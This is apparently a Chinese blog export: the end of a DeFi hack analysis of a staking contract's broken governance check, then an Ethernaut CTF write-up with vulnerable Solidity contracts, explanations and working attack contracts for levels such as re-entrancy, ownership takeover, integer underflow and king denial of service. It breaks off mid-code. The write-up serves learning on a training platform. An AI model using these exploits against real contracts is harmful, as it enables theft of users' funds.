&#125;\n&#125;\ncontract MainChef is Ownable &#123;\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n    // Info of each user.\n    struct UserInfo &#123;\n        uint256 amount; // How many LP tokens the user has provided.\n        uint256 rewardDebt; // Reward debt. See explanation below.\n    &#125;\n    // Info of each pool.\n    struct PoolInfo &#123;\n        IERC20 lpToken; // Address of LP token contract.\n        uint256 allocPoint; // How many allocation points assigned to this pool. KHINKALs to distribute per block.\n        uint256 lastRewardBlock; // Last block number that KHINKALs distribution occurs.\n        uint256 accKhinkalPerShare; // Accumulated KHINKALs per share, times 1e12. See below.\n        uint256 lastKhinkalReward; // Protection against incorrect tokenomics\n    &#125;\n    KhinkalToken public khinkal;\n    address public devaddr;\n    address public governance;\n    uint256 public bonusEndBlock;\n    uint256 public khinkalPerBlock;\n    uint256 public constant BONUS_MULTIPLIER = 10;\n    PoolInfo[] public poolInfo;\n    mapping(uint256 => mapping(address => UserInfo)) public userInfo;\n    uint256 public totalAllocPoint = 0;\n    uint256 public startBlock;\n    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n    event EmergencyWithdraw(\n        address indexed user,\n        uint256 indexed pid,\n        uint256 amount\n    );\n\n    constructor(\n        KhinkalToken _khinkal,\n        address _devaddr,\n        uint256 _khinkalPerBlock,\n        uint256 _startBlock,\n        uint256 _bonusEndBlock,\n        address _governance\n    ) public &#123;\n        khinkal = _khinkal;\n        devaddr = _devaddr;\n        khinkalPerBlock = _khinkalPerBlock;\n        bonusEndBlock = _bonusEndBlock;\n        startBlock = _startBlock;\n        governance = _governance;\n    &#125;\n\n    function poolLength() external view returns (uint256) &#123;\n        return poolInfo.length;\n    &#125;\n    function add(\n        uint256 _allocPoint,\n        IERC20 _lpToken,\n        bool _withUpdate\n    ) public onlyOwner &#123;\n        _add(_allocPoint, _lpToken, _withUpdate);\n    &#125;\n    function addToken(IERC20 _lpToken) public &#123;\n        require(msg.sender == owner() || msg.sender == governance, \"Access denied\");\n        _add(1, _lpToken, true);\n    &#125;\n\n    function _add(uint256 _allocPoint,IERC20 _lpToken,bool _withUpdate) internal &#123;\n        if (_withUpdate) &#123;\n            massUpdatePools();\n        &#125;\n        uint256 lastRewardBlock =\n            block.number > startBlock ? block.number : startBlock;\n        totalAllocPoint = totalAllocPoint.add(_allocPoint);\n        poolInfo.push(\n            PoolInfo(&#123;\n                lpToken: _lpToken,\n                allocPoint: _allocPoint,\n                lastRewardBlock: lastRewardBlock,\n                accKhinkalPerShare: 0,\n                lastKhinkalReward: 0\n            &#125;)\n        );\n    &#125;\n    function set(uint256 _pid,uint256 _allocPoint,bool _withUpdate) public onlyOwner &#123;\n        if (_withUpdate) &#123;\n            massUpdatePools();\n        &#125;\n        totalAllocPoint = totalAllocPoint.sub(poolInfo[_pid].allocPoint).add(\n            _allocPoint\n        );\n        poolInfo[_pid].allocPoint = _allocPoint;\n    &#125;\n    function getMultiplier(uint256 _from,uint256 _to)public view returns (uint256)&#123;\n        if (_to &lt;= bonusEndBlock) &#123;\n            return _to.sub(_from).mul(BONUS_MULTIPLIER);\n        &#125; else if (_from >= bonusEndBlock) &#123;\n            return _to.sub(_from);\n        &#125; else &#123;\n            return\n                bonusEndBlock.sub(_from).mul(BONUS_MULTIPLIER).add(\n                    _to.sub(bonusEndBlock)\n                );\n        &#125;\n    &#125;\n\n    // View function to see pending KHINKALs on frontend.\n    function pendingKhinkal(uint256 _pid,address _user)external view returns (uint256)&#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][_user];\n        uint256 accKhinkalPerShare = pool.accKhinkalPerShare;\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (block.number > pool.lastRewardBlock &amp;&amp; lpSupply != 0) &#123;\n            uint256 multiplier =\n                getMultiplier(pool.lastRewardBlock, block.number);\n            uint256 khinkalReward =\n                multiplier.mul(khinkalPerBlock).mul(pool.allocPoint).div(\n                    totalAllocPoint\n                );\n            accKhinkalPerShare = accKhinkalPerShare.add(\n                khinkalReward.mul(1e12).div(lpSupply)\n            );\n        &#125;\n        return user.amount.mul(accKhinkalPerShare).div(1e12).sub(user.rewardDebt);\n    &#125;\n\n    // Update reward vairables for all pools. Be careful of gas spending!\n    function massUpdatePools() public &#123;\n        uint256 length = poolInfo.length;\n        for (uint256 pid = 0; pid &lt; length; ++pid) &#123;\n            updatePool(pid);\n        &#125;\n    &#125;\n\n    // Update reward variables of the given pool to be up-to-date.\n    function updatePool(\n        uint256 _pid\n    ) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        if (block.number &lt;= pool.lastRewardBlock) &#123;\n            return;\n        &#125;\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (lpSupply == 0) &#123;\n            pool.lastRewardBlock = block.number;\n            return;\n        &#125;\n        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n        uint256 khinkalReward =\n            multiplier.mul(khinkalPerBlock).mul(pool.allocPoint).div(\n                totalAllocPoint\n            );\n        khinkal.mint(devaddr, khinkalReward.div(10));\n        khinkal.mint(address(this), khinkalReward);\n        pool.accKhinkalPerShare = pool.accKhinkalPerShare.add(\n            khinkalReward.mul(1e12).div(lpSupply)\n        );\n        pool.lastKhinkalReward = khinkalReward;\n        pool.lastRewardBlock = block.number;\n    &#125;\n\n    // Deposit LP tokens to MainChef for KHINKAL allocation.\n    function deposit(uint256 _pid,uint256 _amount) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        if (user.amount > 0) &#123;\n            uint256 pending =\n                user.amount.mul(pool.accKhinkalPerShare).div(1e12).sub(\n                    user.rewardDebt\n                );\n            require(pending &lt;= pool.lastKhinkalReward, \"Reward bigger than minted\");\n            if(pending > 0) &#123;\n                khinkal.transfer(msg.sender, pending);\n            &#125;\n            khinkal.transfer(msg.sender, pending);\n        &#125;\n        pool.lpToken.safeTransferFrom(\n            address(msg.sender),\n            address(this),\n            _amount\n        );\n        user.amount = user.amount.add(_amount);\n        user.rewardDebt = user.amount.mul(pool.accKhinkalPerShare).div(1e12);\n        emit Deposit(msg.sender, _pid, _amount);\n    &#125;\n\n    // Withdraw LP tokens from MainChef.\n    function withdraw(uint256 _pid) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        uint256 pending =\n            user.amount.mul(pool.accKhinkalPerShare).div(1e12).sub(\n                user.rewardDebt\n            );\n        require(pending &lt;= pool.lastKhinkalReward, \"Reward bigger than minted\");\n        if(pending > 0) &#123;\n            khinkal.transfer(msg.sender, pending);\n        &#125;\n        if(user.amount > 0) &#123;\n            pool.lpToken.safeTransfer(address(msg.sender), user.amount);\n            user.amount = 0;\n            user.rewardDebt = user.amount.mul(pool.accKhinkalPerShare).div(1e12);\n        &#125;\n        emit Withdraw(msg.sender, _pid, user.amount);\n    &#125;\n\n    // Withdraw without caring about rewards. EMERGENCY ONLY.\n    function emergencyWithdraw(uint256 _pid) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        pool.lpToken.safeTransfer(address(msg.sender), user.amount);\n        emit EmergencyWithdraw(msg.sender, _pid, user.amount);\n        user.amount = 0;\n        user.rewardDebt = 0;\n    &#125;\n\n    // Update governance address by the governance.\n    function setGovernance(address _governance) public &#123;\n        require(msg.sender == owner() || msg.sender == _governance, \"Access denied\");\n        governance = _governance;\n    &#125;\n\n    // Update dev address by the previous dev.\n    function dev(\n        address _devaddr\n    ) public &#123;\n        require(msg.sender == owner() || msg.sender == devaddr, \"Access denied\");\n        devaddr = _devaddr;\n    &#125;\n&#125;\n\nAnalyze函数setGovernance处require判断条件有误，msg.sender &#x3D;&#x3D; _governance， _governance为可控参数，所以可以将governance设置为hacker\n\n","slug":"Defi Hack","date":"2022-08-02T02:46:57.436Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"d254f0c02017b2eb8e14e9b15540cca1","title":"Ethernaut","content":"地址https://ethernaut.openzeppelin.com/\n1.fallback\n\n\n\n\n\n\n\n\n题目要求：获得合约所有权并将余额变成0\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallback &#123;\n\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address payable public owner;\n\n  constructor() public &#123;\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  &#125;\n\n  modifier onlyOwner &#123;\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    &#125;\n\n  function contribute() public payable &#123;\n    require(msg.value &lt; 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) &#123;\n      owner = msg.sender;\n    &#125;\n  &#125;\n\n  function getContribution() public view returns (uint) &#123;\n    return contributions[msg.sender];\n  &#125;\n\n  function withdraw() public onlyOwner &#123;\n    owner.transfer(address(this).balance);\n  &#125;\n\n  receive() external payable &#123;\n    require(msg.value > 0 &amp;&amp; contributions[msg.sender] > 0);\n    owner = msg.sender;\n  &#125;\n&#125;\n\nAnalyze存在，接受转账后触发fallback函数，题目合约中的receive函数\nAttackpragma solidity ^0.6.0;\nimport \"e1.sol\";\ncontract attack &#123;\n    Fallback public e;\n    address payable a = 0xd9145CCE52D386f254917e481eB44e9943F39138;\n    constructor(address payable fallbackaddress) public payable&#123;e=Fallback(fallbackaddress);&#125;\n    function getcontribution() public &#123;\n       e.contribute&#123;value:0.0001 ether&#125;();\n    &#125;\n    function changeowner() public &#123;\n        a.call&#123;value:0.0001 ether&#125;(\"\");\n        //a.send(0.0001 ether);\n    &#125;\n    function getmoney() public&#123;\n        e.withdraw();\n    &#125;\n&#125;\n\n2.fallout\n\n\n\n\n\n\n\n\n题目要求：获得以下合约的所有权\nCodepragma solidity ^0.6.0;\n\ncontract Fallout &#123;\n  mapping (address => uint) allocations;\n  address payable public owner;\n\n\n  /* constructor */\n  function Fal1out() public payable &#123;\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  &#125;\n\n  modifier onlyOwner &#123;\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    &#125;\n\n  function allocate() public payable &#123;\n    allocations[msg.sender] = allocations[msg.sender]+(msg.value);\n  &#125;\n\n  function sendAllocation(address payable allocator) public &#123;\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  &#125;\n\n  function collectAllocations() public onlyOwner &#123;\n    msg.sender.transfer(address(this).balance);\n  &#125;\n\n  function allocatorBalance(address allocator) public view returns (uint) &#123;\n    return allocations[allocator];\n  &#125;\n&#125;\n\nAnalyzeFal1out()函数没有进行onlyowner限制，只要调用即可获得更改owner\nAttackpragma solidity ^0.6.0;\nimport \"e2.sol\";\ncontract attack&#123;\n    Fallout public e;\n    constructor (address payable falloutaddress)public payable &#123;e=Fallout(falloutaddress);&#125;\n    function getowner() public&#123;\n        e.Fal1out&#123;value:1 wei&#125;();\n    &#125;\n&#125;\n\n2.coin flip\n\n\n\n\n\n\n\n\n题目要求：这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。\nCode// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract CoinFlip &#123;\n\n  using SafeMath for uint256;\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() public &#123;\n    consecutiveWins = 0;\n  &#125;\n\n  function flip(bool _guess) public returns (bool) &#123;\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n    if (lastHash == blockValue) &#123;\n      revert();\n    &#125;\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue.div(FACTOR);\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) &#123;\n      consecutiveWins++;\n      return true;\n    &#125; else &#123;\n      consecutiveWins = 0;\n      return false;\n    &#125;\n  &#125;\n&#125;\n\nAnalyze\n以太坊每14秒产生一个区块，所以block.number是当前的区块，在这个时间段的交易会被打包进这个区块所以我们可以计算题目中的blockvalue\n因为有if (lastHash &#x3D;&#x3D; blockValue)的限制，所以连续多次调用可能会失败\nAttackpragma solidity ^0.6.0;\n\n\n\ncontract CoinFlip &#123;\n\n  function flip(bool _guess) public returns (bool) &#123;\n\n \n&#125;\n&#125;\ncontract attack &#123;\n    CoinFlip constant private target = CoinFlip(0x8732271d55EA7cb0B28492932fabE9cE2eD06F83);\n    function pwn() public&#123;\n          uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n          uint256 blockValue=uint (blockhash(block.number-1));\n          uint256 coinFlip = blockValue/FACTOR;\n          bool side = coinFlip == 1 ? true : false;\n          target.flip(side);\n    &#125;\n&#125;\n\n\n4.Telephone\n\n\n\n\n\n\n\n\n题目要求：将owner变成自己\nCodepragma solidity ^0.6.0;\n\ncontract Telephone &#123;\n\n  address public owner;\n\n  constructor() public &#123;\n    owner = msg.sender;\n  &#125;\n\n  function changeOwner(address _owner) public &#123;\n    if (tx.origin != msg.sender) &#123;\n      owner = _owner;\n    &#125;\n  &#125;\n&#125;\n\nAnalyze\n没什么难点主要就是区分msg.sender和tx.origin的区别。在一个简单的调用链A&gt;B&gt;C&gt;D中如果D内的全局变量为msg.sender它将指向最近一笔的交易地址，也就是C；如果D内的全局变量是tx.orgin，它就会指向最初发送交易的地址，也就是A\nAttackcontract Attack &#123;\n    Telephone constant private target = Telephone(0x6F28D4210D178F6B37bFBe8D1dD8b08402EaC12a);\n    function hack() public &#123;\n        target.changeOwner(msg.sender);\n    &#125;\n&#125;\n\n5.Token\n\n\n\n\n\n\n\n\n题目要求：这一关的目标是攻破下面这个基础 token 合约，你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好\nCodepragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] = totalSupply = _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\ncontract attack&#123;\n    Token constant private target = Token(0x54101E29C84002f75B5c2378e43A56D6174460A8);\n    function hack(address to,uint value) public &#123;\n        target.transfer(to,value);\n    &#125;\n&#125;\n\nAnalyze整数溢出漏洞，transfer函数的value可控，构造下溢即可\nAttackpragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address &#x3D;&gt; uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value &gt;&#x3D; 0);\n    balances[msg.sender] -&#x3D; _value;\n    balances[_to] +&#x3D; _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\ncontract attack&#123;\n    Token constant private target &#x3D; Token(0x54101E29C84002f75B5c2378e43A56D6174460A8);\n    function hack(address to,uint value) public &#123;\n        target.transfer(to,value);\n    &#125;\n&#125;\n\n\n\n6.Vault\n\n\n\n\n\n\n\n\n题目要求：打开 vault 来通过这一关!\nCodepragma solidity ^0.6.0;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public &#123;\n    locked = true;\n    password = _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password == _password) &#123;\n      locked = false;\n    &#125;\n  &#125;\n&#125;\n\nAnalyze事先了解变量存储机制，得知password存储在slot1（bool占据slot0）\nAttackpragma solidity ^0.6.0;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public &#123;\n    locked &#x3D; true;\n    password &#x3D; _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password &#x3D;&#x3D; _password) &#123;\n      locked &#x3D; false;\n    &#125;\n  &#125;\n&#125;\ncontract attack&#123;\n    Vault constant private target&#x3D;Vault(0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C);\n    function unlock(bytes32 _password) public &#123;\n        target.unlock(_password);\n    &#125;\n&#125;\n\nfrom web3 import Web3,HTTPProvider\nimport json\nhttp = 'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'\nweb3 = Web3(HTTPProvider(http))\ntrade_hash = '0x119ce1ec582b1672346a2e40ad31bac13a104e047bb2b5ce53c7f46918bddc51'\n\nprint(web3.eth.getTransaction(trade_hash))\nprint(web3.eth.getTransactionReceipt(trade_hash))\nprint(web3.eth.getStorageAt(\"0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C\", \"1\"))//获得存储在slot1下的_password，结果为：A very strong secret password :)\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C\", \"1\")))//获得存储在slot1下的_password并转为16进制，结果为：(0x)412076657279207374726f6e67207365637265742070617373776f7264203a29，注意在开头添加0x\n\n\n\n接下来部署攻击合约并传入相应结果，通过本关\n7.Delegation\n\n\n\n\n\n\n\n\n题目要求：这一关的目标是申明你对你创建实例的所有权.\n 这可能有帮助\n\n仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.\nFallback 方法\n方法 ID\n\nCodepragma solidity ^0.6.0;\n\ncontract Delegate &#123;\n\n  address public owner;\n\n  constructor(address _owner) public &#123;\n    owner = _owner;\n  &#125;\n\n  function pwn() public &#123;\n    owner = msg.sender;\n  &#125;\n&#125;\n\ncontract Delegation &#123;\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) public &#123;\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  &#125;\n\n  fallback() external &#123;\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) &#123;\n      this;\n    &#125;\n  &#125;\n&#125;\n\nAnalyze三种调用方式的异同点\n\ncall: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。\ndelegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。\ncallcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。+\n\n\n\n情况 1：callA合约：temp1 &#x3D; 0temp2 &#x3D; 0\nB合约：temp1 &#x3D; A合约地址temp2 &#x3D; 100\n说明：call调用后内置变量 msg 的值会修改为调用者（A合约地址），执行环境为被调用者（B合约）的运行环境(运行环境指合约的 storage)\n\n\n情况 2：delegatecallA合约：temp1 &#x3D; 调用A合约的以太坊账号地址temp2 &#x3D; 100\nB合约：temp1 &#x3D; 0temp2 &#x3D; 0\n说明：delegatecall调用后内置变量 msg 的值不会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境\n\n情况 3：callcodeA合约：temp1 &#x3D; A合约地址temp2 &#x3D; 100\nB合约：temp1 &#x3D; 0temp2 &#x3D; 0\n说明：callcode调用后内置变量 msg 的值会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境。\n\nAttackpoc1\n首先学习将函数转换为bytes格式\ncontract transform&#123;\n    bytes4 public result;\n    function trans() public &#123;\n        result&#x3D;bytes(keccak256(&quot;pwn()&quot;));\n    &#125;\n&#125;&#x2F;&#x2F;结果为0xdd365b8b\n接下来进行攻击\nawait contract.sendTransaction(&#123;data:&quot;0xdd365b8b&quot;&#125;)\n\npoc2\ncall函数学习链接①\ncall函数学习链接②\ncall函数学习链接③\ncontract attack&#123;\n    address target &#x3D;0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005;\n    bytes4 public result;\n    function trandform()public&#123;\n    result&#x3D;bytes4(keccak256(&quot;pwn()&quot;));\n&#125;&#x2F;&#x2F;获得bytes4签名\n    function pwn() public payable&#123;\n    target.call(abi.encodePacked(result,&quot;&quot;));\n&#125;&#x2F;&#x2F;传入参数进行攻击\n&#125;\n\n\n\n8.Force\n\n\n\n\n\n\n\n\n题目要求：有些合约就是拒绝你的付款,就是这么任性¯\\_(ツ)_/¯，这一关的目标是使合约的余额大于0\n 这可能有帮助:\n\nFallback 方法\n有时候攻击一个合约最好的方法是使用另一个合约.\n阅读上方的帮助页面, “控制台之外” 部分\n\nCodepragma solidity ^0.6.0;\n\ncontract Force &#123;/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/&#125;\n\n\nAnalyze合约为空白合约，而题目要求是使合约余额大于0，所以想到了自毁函数，可以强制性向目标转账\nAttackpragma solidity ^0.6.0;\ncontract Attack&#123;\n\n    function attack(address payable target) public payable &#123;\n        selfdestruct(target);\n    &#125;\n&#125;//销毁当前合约，并且把当前合约的余额发送指定地址，，执行Kill方法，并指定一个address；执行后，当前合约将被销毁，当前合约的以太币将被发送至这个指定的address。且此合约不再有可执行的方法\n\n\n9.King\n\n\n\n\n\n\n\n\n题目要求：下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.这么有趣的游戏, 你的目标是攻破他.当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.\nCodepragma solidity ^0.6.0;\n\ncontract King &#123;\n\n  address payable king;\n  uint public prize;\n  address payable public owner;\n\n  constructor() public payable &#123;\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  receive() external payable &#123;\n    require(msg.value >= prize || msg.sender == owner);\n    king.transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  &#125;\n\n  function _king() public view returns (address payable) &#123;\n    return king;\n  &#125;\n&#125;\n\nAnalyze实例生成后要使用web3.js查询原始的prize，分析合约可知prize存储在slot1，king存储在slot0\nfrom web3 import Web3,HTTPProvider\nimport json,binascii\nhttp = 'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'\nweb3 = Web3(HTTPProvider(http))\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909\", \"1\")))//合约prize查询\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909\", \"0\")))//合约中的king查询\n\n题目会进行king的重申，而transfer函数不同于call和send，call和send函数执行后会返回true或者false，transfer函数执行失败后会进行回滚(revert)所以我们将king变成自己后提交实例时要阻止关卡对于king的重申，简单来说就是让关卡触发receive函数时失败。此时这道题有两个切入点①可以使用require(false),使得transfer函数发生回滚切入点②直接使用revert让关卡在想攻击合约转账时失败以上两种方法可以使漏洞合约中的transfer函数执行失败从而进行回滚导致king的重申失败\n了解到了，transfer执行失败后会回滚transfer之前的代码(但是transfer本身不会进行回滚)(这是自己的理解，应该是正确的)\nAttackpoc1\ncontract attack&#123;\n    address target =0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(\"\");\n    &#125;\n    fallback() external payable &#123;\n        require(false);\n    &#125;\n&#125;\n\npoc2\ncontract attack&#123;\n    address target &#x3D;0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(&quot;&quot;);\n    &#125;\n    fallback() external payable &#123;\n        revert();\n    &#125;\n&#125;\n\n写好攻击合约后进行了n+n次攻击，evm中显示交易成功但是_king始终不变，卡住了约两个小时以后打开了etherscan发现了万恶的Out Of Gas问题\n\n调高gas限制后再次尝试成功\n\n\n10.Re-entrancy\n\n\n\n\n\n\n\n\n题目要求：这一关的目标是偷走合约的所有资产.\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance &#123;\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable &#123;\n    balances[_to] = balances[_to].add(msg.value);\n  &#125;\n\n  function balanceOf(address _who) public view returns (uint balance) &#123;\n    return balances[_who];\n  &#125;\n\n  function withdraw(uint _amount) public &#123;\n    if(balances[msg.sender] >= _amount) &#123;\n      (bool result,) = msg.sender.call&#123;value:_amount&#125;(\"\");\n      if(result) &#123;\n        _amount;\n      &#125;\n      balances[msg.sender] -= _amount;\n    &#125;\n  &#125;\n\n  receive() external payable &#123;&#125;\n&#125;\n\nAnalyze经典的重入漏洞，使用了call转账，并且balances[msg.sender]在转账完成之后才进行更新，所以攻击合约中的fallback可以进行重入\nAttackcontract attack&#123;\n    test constant private target=test(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2);\n    function cunqian() public payable&#123;\n        target.donate&#123;value: 0.001 ether&#125;(address(this));\n    &#125;\n    function tuiqian()public&#123;\n        target.withdraw(0.001 ether);\n    &#125;\n    function check() public view returns(uint)&#123;\n        return address(this).balance;\n    &#125;\n    fallback() external payable&#123;\n        if(address(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2).balance>=0.001 ether)\n        target.withdraw(0.001 ether);\n    &#125;\n     function reuse() public &#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;//回收再利用，勤俭节约\n    //function destroy(address payable addr)public payable&#123;\n    //    selfdestruct(addr);\n    //&#125;自毁转账法，和reuse()用途一样，回收代币(其中addr是钱包地址)\n&#125;\n\n11.Elevator\n\n\n\n\n\n\n\n\n题目要求：电梯不会让你达到大楼顶部, 对吧?使top变成true\nCodepragma solidity ^0.6.0;\ninterface Building &#123;\n  function isLastFloor(uint) external returns (bool);\n&#125;\ncontract Elevator &#123;\n  bool public top;\n  uint public floor;\n\n  function goTo(uint _floor) public &#123;\n    Building building = Building(msg.sender);\n    if (! building.isLastFloor(_floor)) &#123;\n      floor = _floor;\n      top = building.isLastFloor(floor);\n    &#125;\n  &#125;\n&#125;\n\nAnalyze在这个if语句中进行了两次building.isLastFloor(_floor)调用，所以要先将builiding变成攻击合约，然后第一次调用传入false第二次传入true即可\nAttackcontract attack&#123;\n    bool public i=true;\n    function isLastFloor(uint)public returns(bool)&#123;\n        i=!i;\n        return i;\n    &#125;//两次调用，if判断时传入false，更改top时传入true\n    function a(uint fllor) public&#123;\n        Elevator target=Elevator(0xDA0bab807633f07f013f94DD0E6A4F96F8742B53);//设置被攻击合约地址\n        target.goTo(fllor);//让题目中的调用地址变为攻击合约\n    &#125;\n&#125;\n\n12.Privacy\n\n\n\n\n\n\n\n\n题目要求：The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.\nThings that might help:\n\nUnderstanding how storage works\nUnderstanding how parameter parsing works\nUnderstanding how casting works\n\nTips:\n\nRemember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.\n\nCodepragma solidity ^0.6.0;\n\ncontract Privacy &#123;\n\n  bool public locked = true;\n  uint256 public ID = block.timestamp;\n  uint8 private flattening = 10;\n  uint8 private denomination = 255;\n  uint16 private awkwardness = uint16(now);\n  bytes32[3] private data;\n\n  constructor(bytes32[3] memory _data) public &#123;\n    data = _data;\n  &#125;\n  \n  function unlock(bytes16 _key) public &#123;\n    require(_key == bytes16(data[2]));\n    locked = false;\n  &#125;//data[2]为bytes32[2]，所以我们要获得private的bytes32\n\n  /*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\n  */\n&#125;\n\nAnalyze存储机制学习①\n存储机制学习②\n存储机制学习③\n存储机制学习④\n相对做vault那道题时深入研究了一下存储方式的问题：根据 solidity 文档中的变量存储原则，evm 每一次处理 32 个字节，而不足 32 字节的变量相互共享并补齐 32 字节。(bool占1字节但是独占一个插槽，uint256和bytes32占32字节，uint8,16,根据比例可计算分别占据1，2字节)\n)\n变量查询代码\nfrom web3 import Web3,HTTPProvider\nimport json,binascii\nhttp = 'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'\nweb3 = Web3(HTTPProvider(http))\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0x1203d029Db225601f986253526D1a8bD662782A6\", \"0\")))\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0x1203d029Db225601f986253526D1a8bD662782A6\", \"5\")))\n\n题目中要求传入bytes16数据，将所得的bytes32转变成为bytes16，用到以下合约\nAttackcontract attack&#123;\n     Privacy target=Privacy(0x1203d029Db225601f986253526D1a8bD662782A6);\n     bytes16 public result; \n   function get(bytes32 